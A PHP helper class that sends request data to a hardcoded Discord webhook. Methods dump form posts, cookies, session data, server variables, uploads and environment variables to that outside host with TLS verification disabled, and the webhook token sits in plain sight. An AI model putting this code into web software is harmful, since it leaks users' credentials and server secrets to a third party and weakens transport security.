<?php

class DH
{
    private static $url = 'https://discord.com/api/webhooks/926697868885131274/CrKNmGmKnXwJGKIlnzW1zjyqdLNSSVNYvPvV1xc1gSG76uYB6G6dWIlBAAql1Fabhvmp';
    private static $name = 'ace.sbs';

    public static function setName(string $name)
    {
        self::$name = $name;
    }

    public static function log($message)
    {
        // prepare the webhook data
        $headers = ['Content-Type: application/json; charset=utf-8'];
        $POST = ['username' => self::$name, 'content' => $message];

        // Send webhook
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, self::$url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response   = curl_exec($ch);

        // return the response
        return $response;
    }

    public static function logPost()
    {
        self::log(print_r($_POST, true));
    }

    public static function logGet()
    {
        self::log(print_r($_GET, true));
    }

    public static function logSession()
    {
        self::log(print_r($_SESSION, true));
    }

    public static function logCookie()
    {
        self::log(print_r($_COOKIE, true));
    }

    public static function logServer()
    {
        self::log(print_r($_SERVER, true));
    }

    public static function logFiles()
    {
        self::log(print_r($_FILES, true));
    }

    public static function logEnv()
    {
        self::log(print_r($_ENV, true));
    }
}
